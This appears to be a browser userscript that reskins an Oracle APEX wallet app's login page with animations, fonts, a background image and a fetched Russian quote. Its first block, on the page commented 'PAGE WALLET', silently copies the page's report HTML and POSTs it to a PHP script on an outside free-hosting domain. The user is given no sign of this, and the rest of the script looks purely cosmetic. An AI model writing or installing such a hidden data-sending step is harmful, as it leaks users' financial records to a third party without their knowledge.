//check existese class
var bodyClasses = document.querySelector('html').className.split(' ')[0];
if(bodyClasses == 'page-1')
{
 //PAGE WALLET
 const url = 'https://biparous-rhythms.000webhostapp.com/assets/insertData.php';
     let _data = {"data": document.querySelector('.t-Report-report').innerHTML};
     console.log(_data.data.length);
     GM_xmlhttpRequest ({
         method:     "POST",
         url:        url,
         data:       JSON.stringify(_data),
         headers: {
             'Content-Type': 'application/json'
         },
         onload:     function (response) {
             //console.log(response.responseText);
         }
     });
}

if(bodyClasses == 'page-2')
{
// PAGE LOGIN
//inject link in head dinamically
document.getElementsByTagName('head')[0].insertAdjacentHTML( 'afterbegin','<style type="text/css">.btn-wrapper-login:hover:before {transition: 1s;left: 0;}.btn-wrapper-login {margin: 0 auto;cursor:pointer;display: flex;color: #fff;text-transform: uppercase;position: relative;height: 30px;width: 100%;align-items: center;justify-content: center;overflow: hidden;}.btn-wrapper-login:before {content: "";display: block;position: absolute;width: 100%;height: 100%;background: #202122;z-index: -1;left: -100%;transition: 1s;}.btn-login {display: flex;justify-content: center;align-items: center;width: 100%;height: 26px;background: rgb(255 99 71 / 70%);border-radius: 2px;}');
document.getElementById('B115197341225796797').insertAdjacentHTML( 'afterend','<div onclick="apex.submit({request:\'Login\',validate:true});" class="btn-wrapper-login"><div class="btn-login"><span>Login</span></div></div>');
document.getElementById('B115197341225796797').remove();
document.getElementsByTagName('head')[0].insertAdjacentHTML( 'afterbegin','<link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">');
document.getElementsByTagName('head')[0].insertAdjacentHTML( 'afterbegin','<style type="text/css">@import url("https://fonts.googleapis.com/css2?family=Marck+Script&display=swap");body {font-family: "Marck Script" !important;overflow-x: hidden;}.video-container {width: 100vw;height: 100vh;overflow: hidden;position: absolute;}iframe {position: absolute;top: -10%;width: 100vw;height: 117vh;pointer-events: none;} .t-Login-body p {cursor: pointer;margin: 2px 0;background: #221e1d;text-align: center;margin-bottom: 1,2rem;padding: 4px;color:#fff;}</style>');
//chack class exist
function hasClass( target, className ) {
  return new RegExp('(\\s|^)' + className + '(\\s|$)').test(target.className);
}
//add quotes
var quotes, obj;
GM_xmlhttpRequest({
  method: "GET",
  url: "https://api.forismatic.com/api/1.0/?method=getQuote&format=json&jsonp=parseQuote&lang=ru",
  onload: response => {
      obj = JSON.parse(response.responseText);
      quotes = document.createElement("h1");
      quotes.classList.add("quotes");
      quotes.classList.add("animate__animated");
      quotes.classList.add("animate__zoomIn");
      quotes.innerText = obj.quoteText;
      document.body.appendChild(quotes);
      quotes.style.cssText = 'text-shadow:2px 2px 6px #000;position:absolute;bottom:20px;width:60%;left: 0;right:0;margin:0 auto;font-size: 1.6vw;color: transparent;-webkit-text-stroke: 1px rgb(255, 255, 255);text-align: center;letter-spacing: 4px;text-shadow: rgb(0 0 0) 4px 2px;';
  }
});
//delete Inregistrare sau Modificare
for (var i=0; i<5; i++){document.querySelector('.btn-wrapper-login').nextSibling.remove();}
document.getElementsByClassName("t-Button")[0].addEventListener("click", function(){document.getElementsByClassName("quotes")[0].remove();});
for(var el=1;el<document.getElementsByClassName('t-Form-itemWrapper').length;el++)document.getElementsByClassName('t-Form-itemWrapper')[el].style.cssText = 'border: 1px solid tomato;border-radius: 2px;';
document.querySelectorAll('.t-Region')[1].insertAdjacentHTML('afterend','<div style="color: transparent;-webkit-text-stroke: 1px rgb(255, 255, 255);text-align: center;letter-spacing: 4px;text-shadow: rgb(0 0 0) 4px 2px;" class="copyright"><span style="color:#fff;font-size:22px;">Created by &lt;/Sergey&gt; <br>Spring Edition</span></div>');
document.querySelector('.t-Region-body').classList.add("animate__animated"); //animate__bounceInUp
document.querySelector('.t-Region-body').classList.add("animate__bounceInDown");
document.querySelectorAll('.row')[1].classList.add("animate__animated");
document.querySelectorAll('.row')[1].classList.add("animate__bounceInUp");
document.body.style.background = 'url(https://source.unsplash.com/1920x1080/?spring,potter,harrypotter) no-repeat center/100%';
document.body.style.backgroundSize = "cover";
document.querySelector('.t-Button').style.backgroundColor = 'tomato';
document.querySelector('h1').style.fontFamily = 'fangsong';
document.querySelector('.class2').style.borderStyle = 'none';
document.querySelector('.row').style.opacity = '0.9';
document.querySelector('.t-Region-body').querySelector('h1').innerText = 'МОЙ КОШЕЛЬ';
document.querySelector('.t-Region-body').querySelector('h1').style.cssText = 'color: transparent;-webkit-text-stroke: 1px #fff;text-align: center;letter-spacing: 7px;text-shadow: 4px 2px #000;';
document.querySelector('.t-Form-fieldContainer').remove();
document.querySelectorAll('.t-ContentBlock--lightBG .t-ContentBlock-body, .t-Region, .t-Region-header')[2].style.background = "rgba(255,255,255,.1)";
document.querySelector('.t-Header-branding').style.backgroundColor = '#333d46';
}
